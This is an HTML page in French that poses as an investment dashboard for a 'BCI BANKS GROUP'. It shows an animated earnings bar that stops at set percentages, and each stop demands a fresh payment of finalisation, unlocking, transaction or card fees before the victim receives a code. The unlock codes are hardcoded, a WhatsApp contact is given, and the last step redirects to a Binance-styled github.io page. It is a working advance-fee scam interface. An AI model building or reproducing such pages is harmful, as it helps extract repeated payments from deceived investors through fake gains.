<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>investissement et finance</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Montserrat', 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #181A20 0%, #2B2F36 100%);
      color: #EAECEF;
      min-height: 100vh;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      position: relative;
      overflow-x: hidden;
    }
    .card {
      background: linear-gradient(120deg, #2B2F36 80%, #3C4043 100%);
      color: #EAECEF;
      width: 100%;
      max-width: 540px;
      border-radius: 28px;
      padding: 32px 28px 28px 28px;
      box-shadow: 0 8px 32px rgba(240,185,11,0.15), 0 2px 8px rgba(0,0,0,0.1);
      margin-bottom: 32px;
      position: relative;
      overflow: hidden;
      border: 1.5px solid #F0B90B;
      animation: fadeInCard 1.1s cubic-bezier(.4,0,.2,1);
    }
    @keyframes fadeInCard {
      from { opacity: 0; transform: translateY(40px);}
      to { opacity: 1; transform: translateY(0);}
    }
    .card::before {
      content: '';
      position: absolute;
      top: -60px; right: -60px;
      width: 160px; height: 160px;
      background: radial-gradient(circle, #F0B90B 0%, #fff0 80%);
      border-radius: 50%;
      z-index: 0;
      animation: pulse 4s infinite ease-in-out;
    }
    @keyframes pulse {
      0%,100% { transform: scale(1); opacity: 0.15; }
      50%    { transform: scale(1.18); opacity: 0.08; }
    }
    .card h2 {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 18px;
      display: flex;
      align-items: center;
      gap: 10px;
      color: #F0B90B;
      z-index: 1;
      position: relative;
      letter-spacing: 0.5px;
    }
    .info {
      display: flex;
      align-items: center;
      margin: 12px 0;
      font-size: 1.08rem;
      z-index: 1;
      position: relative;
      background: linear-gradient(90deg, #3C4043 80%, #2B2F36 100%);
      border-radius: 12px;
      padding: 8px 12px;
      box-shadow: 0 2px 8px rgba(240,185,11,0.1);
      transition: box-shadow 0.2s;
    }
    .info i {
      width: 26px;
      color: #F0B90B;
      margin-right: 12px;
      font-size: 1.1em;
    }
    .info span {
      font-weight: 600;
      margin-right: 5px;
      color: #EAECEF;
    }
    .highlight {
      color: #F0B90B;
      font-weight: bold;
      font-size: 1.1em;
      letter-spacing: 0.5px;
    }
    .progress-container {
      width: 100%;
      background: #3C4043;
      border-radius: 20px;
      overflow: hidden;
      height: 32px;
      margin-bottom: 18px;
      border: 1.5px solid #F0B90B;
      box-shadow: 0 2px 8px rgba(240,185,11,0.2);
    }
    .progress-bar {
      height: 100%;
      width: 0%;
      transition: width 0.5s cubic-bezier(.4,0,.2,1);
      background: linear-gradient(90deg, #F0B90B 0%, #FCD34D 100%);
      box-shadow: 0 2px 8px rgba(240,185,11,0.3);
    }
    .amount-display {
      font-size: 1.25rem;
      margin-bottom: 18px;
      font-weight: 700;
      color: #F0B90B;
      letter-spacing: 0.5px;
      text-align: center;
    }
    #blockMessage, #codeInputWrapper {
      display: none;
      color: #e53935;
      margin-bottom: 15px;
      text-align: center;
      font-weight: 600;
    }
    #bonusProgressBar {
      background: linear-gradient(90deg, #28a745 0%, #20c997 100%) !important;
      box-shadow: 0 2px 8px rgba(40, 167, 69, 0.3);
    }
    #bonusAmountDisplay {
      color: #28a745 !important;
    }
    .bonus-title {
      margin-top: 20px !important;
    }
    .security-title {
      font-weight: 700;
      color: #F0B90B;
    }
    input[type="text"] {
      padding: 10px;
      width: calc(100% - 22px);
      border-radius: 8px;
      border:1.5px solid #F0B90B;
      font-size: 1rem;
      margin-bottom: 8px;
      outline: none;
      transition: border 0.2s;
      background: #2B2F36;
      color: #EAECEF;
    }
    input[type="text"]:focus {
      border: 1.5px solid #FCD34D;
      background: #3C4043;
    }
    button {
      padding: 10px 22px;
      border:none;
      border-radius:8px;
      cursor:pointer;
      background:linear-gradient(90deg,#F0B90B,#FCD34D);
      color:#000;
      font-weight: 700;
      font-size: 1rem;
      transition:transform 0.2s, background 0.2s;
      margin-left: 6px;
      margin-right: 6px;
      box-shadow: 0 2px 8px rgba(240,185,11,0.3);
    }
    button:hover { transform:scale(1.05); background:linear-gradient(90deg,#FCD34D,#F0B90B);}
    #completionButton { background:#F0B90B; display:none; }
    #completionButton:hover { background: #E4A500; }

    /* WhatsApp bouton flottant */
    .whatsapp-float {
      position: fixed;
      left: 25px;
      bottom: 25px;
      background: #25d366;
      color: white;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 2.2rem;
      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
      z-index: 999;
      transition: background 0.3s, transform 0.3s;
      text-decoration: none;
    }
    .whatsapp-float:hover {
      background: #128c7e;
      transform: scale(1.08);
    }

    /* Bloc d'explication */
    .explain-block {
      background: linear-gradient(120deg, #2B2F36 80%, #3C4043 100%);
      border: 1.5px solid #F0B90B;
      border-radius: 18px;
      padding: 18px 22px;
      margin: 0 auto 22px auto;
      max-width: 540px;
      box-shadow: 0 2px 8px rgba(240,185,11,0.15);
      color: #EAECEF;
      font-size: 1.08rem;
      display: flex;
      align-items: flex-start;
      gap: 16px;
      animation: fadeInCard 1.1s cubic-bezier(.4,0,.2,1);
    }
    .explain-block i {
      font-size: 1.5rem;
      margin-top: 2px;
      color: #F0B90B;
      flex-shrink: 0;
    }
    .explain-block .fa-info-circle { color: #F0B90B; }
    .explain-block .fa-lock { color: #FCD34D; }
    .explain-block .fa-shield-alt { color: #F0B90B; }
    @media (max-width: 600px) {
      .card, .explain-block { padding: 16px 6vw; }
      .card { max-width: 98vw; }
      .explain-block { max-width: 98vw; }
      .whatsapp-float { width: 48px; height: 48px; font-size: 1.5rem;}
    }
  </style>
</head>
<body>

  <!-- SECTION PROFIL -->
  <div class="card" id="profileCard">
    <h2><i class="fas fa-user-circle"></i> BCI BANKS GROUP Investissement - Profil</h2>
    <div id="infos">
      <p>Aucun profil trouvé. Veuillez remplir le formulaire.</p>
    </div>
  </div>
 <div class="bg-[#1a1a1a] p-2 rounded-lg mb-6 w-full fade-in shadow-lg border border-blue-900/40">
      <iframe src="https://s.tradingview.com/widgetembed/?frameElementId=tradingview_apple&symbol=NASDAQ%3AAAPL&interval=D&hidesidetoolbar=1&symboledit=1&saveimage=1&toolbarbg=F1F3F6&studies=[]&theme=dark&style=1&timezone=Etc%2FUTC&withdateranges=1&hideideas=1&hidelegend=0&locale=fr" width="100%" height="300" frameborder="0" allowtransparency="true" scrolling="no"></iframe>
    </div>
  <!-- SECTION PROGRESSION -->
  <div class="card">
    <h2><i class="fas fa-chart-line"></i> Génération de votre revenu</h2>
    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="amount-display" id="amountDisplay">0</div>
    
    <!-- Nouvelle barre de bonus -->
    <h2 class="bonus-title"><i class="fas fa-gift"></i> Bonus de fidélité (50%)</h2>
    <div class="progress-container">
      <div class="progress-bar" id="bonusProgressBar"></div>
    </div>
    <div class="amount-display" id="bonusAmountDisplay">0</div>
    
    <div id="blockMessage">⛔ Code requis pour continuer.</div>
    <div id="codeInputWrapper">
      <input type="text" id="codeInput" placeholder="Entrez le code ici">
      <button onclick="submitCode()">COMMENCER</button>
    </div>
    <button id="completionButton" onclick="showCompletionPopup()">Terminer</button>
  </div>
 
  <!-- Blocs d'explication et sécurité -->
  <div class="explain-block">
    <i class="fas fa-shield-alt"></i>
    <div>
      <div class="security-title">Sécurité maximale</div>
      <div>Toutes vos transactions sont protégées par un chiffrement avancé. Nous ne partageons jamais vos données personnelles avec des tiers.</div>
    </div>
  </div>
 
  <div class="explain-block">
    <i class="fas fa-user-shield"></i>
    <div>
      <div class="security-title">Protection des données</div>
      <div>Vos informations sont stockées de manière sécurisée et ne sont accessibles qu'à vous. Nous utilisons des protocoles de sécurité avancés.</div>
    </div>
  </div>

  <a href="https://wa.me/+237657145121" class="whatsapp-float" target="_blank" rel="noopener" title="Contactez-nous sur WhatsApp">
    <i class="fab fa-whatsapp"></i>
  </a>

  <script>
    // --- Chargement du profil ---
    const data = JSON.parse(localStorage.getItem('profilInvestisseur'));
    const infos = document.getElementById('infos');
    if (data) {
      let tempsInfo = '';
      if (data.tempsInvestissement && data.pays === 'Congo (RDC)') {
        tempsInfo = `<div class="info"><i class="fas fa-clock"></i><span>Durée :</span>${data.tempsInvestissement}</div>`;
      }
      infos.innerHTML = `
        <div class="info"><i class="fas fa-user"></i><span>Nom :</span>${data.nom}</div>
        <div class="info"><i class="fas fa-flag"></i><span>Pays :</span>${data.pays}</div>
        <div class="info"><i class="fas fa-phone"></i><span>Téléphone :</span>${data.indicatif} ${data.telephone}</div>
        <div class="info"><i class="fas fa-credit-card"></i><span>Paiement :</span>${data.paiement}</div>
        ${tempsInfo}
        <div class="info"><i class="fas fa-money-bill-wave"></i><span>Investi :</span>${data.montant} ${data.devise}</div>
        <div class="info"><i class="fas fa-chart-line"></i><span>Revenu attendu :</span><span class="highlight">${data.revenu} ${data.devise}</span></div>
      `;
    }

    // --- Paramètres progression ---
    const targetAmount = data ? parseInt(data.revenu) : 1000000;
    const bonusAmount = Math.floor(targetAmount * 0.65); // 50% de bonus
    const currency     = data ? data.devise          : "0";
    let progress       = 0, currentCheckpoint = 0, progressInterval;

    const checkpoints = [0, 90, 94, 96, 98];
    const codes       = ["FR57HE27", "FNY74DG56", "IUH8R5V9", "6J79HOG6", "O8YVY678J"];
    const errorMsg    = [
      "❌ Veuillez verser votre premier investissement et entrez le code reçu qui vous sera communiqué par la direction.",
      "❌ Veuillez payer les frais de finalisation pour poursuivre votre investissement et obtenir vos gains.",
      "❌ Veuillez payer les frais de déblocage pour continuer le processus.",
      "❌ Veuillez payer les frais de transaction pour protéger votre investissement.",
      "❌ Veuillez payer les frais de carte pour finaliser votre demande."
    ];

    function startProgress() {
      document.getElementById("blockMessage").style.display = "none";
      document.getElementById("codeInputWrapper").style.display = "none";
      progressInterval = setInterval(() => {
        if (progress >= 100) {
          clearInterval(progressInterval);
          return document.getElementById("completionButton").style.display = "inline-block";
        }
        if (progress === checkpoints[currentCheckpoint]) {
          clearInterval(progressInterval);
          document.getElementById("blockMessage").textContent = errorMsg[currentCheckpoint];
          document.getElementById("blockMessage").style.display = "block";
          document.getElementById("codeInputWrapper").style.display = "block";
          return;
        }
        progress++;
        
        // Mise à jour de la barre principale
        const amt = Math.floor((progress/100)*targetAmount).toLocaleString();
        document.getElementById("progressBar").style.width = `${progress}%`;
        document.getElementById("amountDisplay").textContent = `${amt} ${currency}`;
        
        // Mise à jour de la barre de bonus (50% du montant principal)
        const bonusAmt = Math.floor((progress/100)*bonusAmount).toLocaleString();
        document.getElementById("bonusProgressBar").style.width = `${progress}%`;
        document.getElementById("bonusAmountDisplay").textContent = `${bonusAmt} ${currency}`;
      }, 2800);
    }

    function submitCode() {
      const val = document.getElementById("codeInput").value.trim();
      if (val === codes[currentCheckpoint]) {
        currentCheckpoint++;
        document.getElementById("codeInput").value = "";
        startProgress();
      } else {
        alert("⛔ Code incorrect. Réessayez.");
      }
    }

    // Lancement auto au chargement
    window.onload = startProgress;

    function showCompletionPopup() {
      // Calcul du montant total (principal + bonus)
      const totalAmount = targetAmount + bonusAmount;
      const formattedTotal = totalAmount.toLocaleString();
      
      // Créer un conteneur pour le pop-up
      const popup = document.createElement("div");
      popup.style.position = "fixed";
      popup.style.top = "50%";
      popup.style.left = "50%";
      popup.style.transform = "translate(-50%, -50%)";
      popup.style.background = "#fff";
      popup.style.color = "#232946";
      popup.style.padding = "24px";
      popup.style.borderRadius = "16px";
      popup.style.boxShadow = "0 4px 24px rgba(0, 80, 180, 0.18)";
      popup.style.textAlign = "center";
      popup.style.zIndex = "1000";
      popup.style.minWidth = "260px";
      popup.style.maxWidth = "90vw";
      popup.style.fontFamily = "'Montserrat', 'Segoe UI', sans-serif";

      // Ajouter un message de félicitations avec le total
      const message = document.createElement("p");
      message.innerHTML = `🎉 Félicitations !<br>Vous avez généré <strong>${formattedTotal} ${currency}</strong><br>(Principal: ${targetAmount.toLocaleString()} + Bonus: ${bonusAmount.toLocaleString()})`;
      message.style.marginBottom = "20px";
      message.style.fontWeight = "700";
      message.style.fontSize = "1.15rem";
      popup.appendChild(message);

      // Ajouter un bouton de redirection
      const redirectButton = document.createElement("button");
      redirectButton.textContent = "Recevoir mes gains";
      redirectButton.style.padding = "10px 22px";
      redirectButton.style.background = "#F0B90B";
      redirectButton.style.color = "#000";
      redirectButton.style.border = "none";
      redirectButton.style.borderRadius = "8px";
      redirectButton.style.cursor = "pointer";
      redirectButton.style.transition = "background 0.3s ease";
      redirectButton.style.fontWeight = "700";
      redirectButton.style.marginBottom = "10px";
      redirectButton.onclick = () => {
        window.location.href = "https://binance-forex.github.io/investissement-trading/";
      };
      redirectButton.onmouseover = () => {
        redirectButton.style.background = "#FCD34D";
      };
      redirectButton.onmouseout = () => {
        redirectButton.style.background = "#F0B90B";
      };
      popup.appendChild(redirectButton);

      // Ajouter un bouton pour fermer le pop-up
      const closeButton = document.createElement("button");
      closeButton.textContent = "Fermer";
      closeButton.style.marginTop = "10px";
      closeButton.style.marginLeft = "10px";
      closeButton.style.padding = "10px 22px";
      closeButton.style.background = "#e53935";
      closeButton.style.color = "#fff";
      closeButton.style.border = "none";
      closeButton.style.borderRadius = "8px";
      closeButton.style.cursor = "pointer";
      closeButton.style.transition = "background 0.3s ease";
      closeButton.style.fontWeight = "700";
      closeButton.onclick = () => {
        document.body.removeChild(popup);
      };
      closeButton.onmouseover = () => {
        closeButton.style.background = "#b71c1c";
      };
      closeButton.onmouseout = () => {
        closeButton.style.background = "#e53935";
      };
      popup.appendChild(closeButton);

      document.body.appendChild(popup);
    }
  </script>
</body>
</html>
